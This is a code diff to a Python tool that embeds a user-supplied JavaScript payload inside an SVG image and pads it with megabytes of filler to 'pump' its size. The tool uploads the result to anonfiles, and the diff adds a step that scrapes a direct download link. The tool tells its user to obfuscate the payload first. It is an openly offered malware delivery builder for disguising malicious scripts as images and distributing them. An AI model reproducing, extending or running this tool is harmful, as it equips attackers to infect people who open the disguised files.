@@ -1,5 +1,6 @@
 import time
 import os
+import re
 try:
     import requests
 except ImportError:
@@ -19,15 +20,25 @@ SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
 class main:
     def __init__(self) -> None:
         self.js_code = input("Where is your file path to the JavaScript payload file? -> ")
-        self.name = input("What do you want to name the file? -> ")
+        self.name = input("What do you want to name the file? (without extension) -> ")
         self.filetype = input("What file type do you want to save it as? (Example = zip, txt, exe, etc.) -> ")
+        self.download_link_type = input("Would you also like the direct download link? (y/n) -> ")
         pump = input("Would you like to pump the file for more size? (y/n) -> ")
         if pump.lower() == "y":
             self.pump = input("How many MB would you like to pump the file? -> ")
         else:
             self.pump = False
         self.main()
+        input("Press enter to exit")
         
+    def get_direct_download_link(self, url):
+        r = requests.get(url)
+        text = r.text
+        regex = r'https://cdn-[0-9]+\.anonfiles\.com/[A-Za-z0-9]+/[A-Za-z0-9]+-[0-9]+/[^"]+'
+        match = re.findall(regex, text)
+        return match[0]
+
+
     def main(self):
         print("Please remember to Obfuscate your JavaScript code before using this tool.")
         try:
@@ -38,7 +49,7 @@ class main:
             print("File not found")
             time.sleep(3)
             exit()
-            
+
         extra_chars = "A" * (1024 * 1024 * int(self.pump))
         svg = SVG.replace("%code%", js_code) + extra_chars
         svg_bytes = svg.encode("utf-8")
@@ -48,8 +59,13 @@ class main:
             print(f"[-] {e}")
             time.sleep(3)
             exit()
-        url = r.json()["data"]["file"]["url"]["full"]
-        print(url)
+        url = r.json()["data"]["file"]["url"]["short"]
+        if self.download_link_type.lower() == "y":
+            download_link = self.get_direct_download_link(url)
+            print(f"Download link (short): {url} | Download link (direct): {download_link}")
+        else:
+            print(f"Download link: {url}")
+
 
 if __name__ == '__main__':
     main()
